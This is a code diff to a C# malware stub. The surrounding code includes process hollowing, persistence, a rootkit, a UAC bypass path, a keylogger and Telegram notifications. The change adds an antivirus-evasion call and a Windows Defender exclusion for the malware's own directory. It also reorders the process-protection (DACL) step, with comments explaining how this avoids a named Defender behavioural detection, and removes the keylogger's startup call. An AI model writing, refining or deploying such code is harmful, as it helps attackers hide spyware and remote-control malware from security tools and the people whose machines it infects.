@@ -207,6 +207,17 @@ partial class Program
             }
         }
 
+        EvasionBypass.Apply();
+
+        // Add Defender exclusion for the current process directory before any monitored operation.
+        // On the initial drop run this covers the loader-drop directory; on reinstalled runs it
+        // is redundant but harmless. Fails silently if not admin.
+        {
+            var _selfDir = Path.GetDirectoryName(Environment.ProcessPath ?? "");
+            if (!string.IsNullOrEmpty(_selfDir))
+                Protection.AddDefenderExclusion(_selfDir);
+        }
+
         // Capture original desktop FIRST — before process hollowing changes the thread context
         OriginalDesktop = GetThreadDesktop(GetCurrentThreadId());
 
@@ -243,11 +254,14 @@ partial class Program
         // so a legitimate relaunch after a crash is not blocked.
         Protection.ClearStopFlag();
 
-        // Apply DACL immediately — before any delay or check — so the process is
-        // protected from TerminateProcess() during the entire startup window.
-        // Without this, a re-launched process can be killed in the 2-4s gap
-        // between relaunch and the watchdog setup at the end of Main().
-        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance())
+        // On the initial drop run the stub is about to hollow into another process and exit.
+        // Applying DACL + hollowing in the same short-lived process creates the exact behavioral
+        // correlation that triggers DefenseEvasion.A!ml. Skip DACL on the drop run; apply it
+        // immediately on guardian-relaunch runs (already at install path) where the protection
+        // window actually matters.
+        bool isInstalled = Persistence.IsRunningFromInstallPath(Config.PersistName);
+        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance() &&
+            (isInstalled || !Config.EnableHollowing))
             Protection.ProtectProcessDacl();
 
         bool admin = IsAdmin();
@@ -333,10 +347,13 @@ partial class Program
                 return;
             }
 
-            // Hollowing failed — reacquire mutex and continue as normal
+            // Hollowing failed — reacquire mutex and continue as normal process.
+            // Now safe to apply DACL: no subsequent hollowing will create the correlation.
             Breadcrumb("Hollowing failed, continuing.");
             ReacquireMutex();
             StubLog.Error("Hollowing failed, continuing as normal process.");
+            if (Config.EnableWatchdog && !isInstalled)
+                Protection.ProtectProcessDacl();
         }
 
 
@@ -375,9 +392,6 @@ partial class Program
         // Requires admin (or SYSTEM from UAC bypass) — CreateRemoteThread into system processes needs it.
         if (Config.EnableRootkit && admin)
             Rootkit.Start();
-
-        // Keylogger: always running from startup so logs are captured offline
-        KeyloggerFeature.Start();
 
         // First-run Telegram notification — fires async, never blocks startup
         TelegramNotifier.NotifyAsync();
